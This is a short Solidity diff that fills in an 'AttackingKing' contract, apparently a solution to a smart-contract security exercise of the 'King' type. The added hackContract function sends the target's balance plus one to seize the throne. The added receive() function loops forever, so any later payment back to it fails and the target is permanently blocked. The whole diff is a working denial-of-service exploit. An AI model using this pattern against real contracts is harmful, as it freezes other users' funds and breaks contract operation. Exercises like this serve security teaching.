@@ -10,7 +10,12 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+   receive() external payable {
+        while(true) {}
+    }
+
     function hackContract() external {
-        // Code me!
+        uint bareMinimum = contractAddress.balance + 1;
+        contractAddress.call{value: bareMinimum, gas: 10000000}("");
     }
 }
